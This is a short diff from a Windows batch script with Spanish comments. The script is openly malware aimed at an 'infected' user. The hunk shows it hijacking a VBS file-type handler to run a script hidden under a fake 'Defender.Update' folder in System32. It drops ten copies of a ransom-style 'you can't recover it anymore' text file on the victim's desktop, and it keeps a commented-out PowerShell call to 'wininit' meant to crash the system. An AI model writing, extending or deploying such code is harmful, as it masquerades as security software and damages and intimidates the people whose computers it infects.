@@ -87,14 +87,13 @@ ftype VBSExeHandler=wscript.exe "C:\Windows\System32\Microsoft\Protect\Defender.
 
 ::Archivos SPAM en el escritorio del infectado
 set "escritorio=%USERPROFILE%\Desktop"
-set "archivoFuente=C:\Windows\System32\Microsoft\Protect\Defender.Update\main.txt"
+set "archivoFuente=C:\Windows\System32\Microsoft\Protect\Defender.Update\YA.NO.LO.PUEDES.RECUPERAR.txt"
 
 if not exist "%archivoFuente%" exit /b
 
 for /l %%i in (1,1,10) do (
-    copy "%archivoFuente%" "%escritorio%\YA NO LO PUEDES RECUPERAR.txt" >nul
+    copy "%archivoFuente%" "%escritorio%\YA.NO.LO.PUEDES.RECUPERAR.txt" >nul
 )
-
 
 ::Regalito Grodo (da error a los demas codigos aveces funciona)
 ::powershell -Command "wininit"
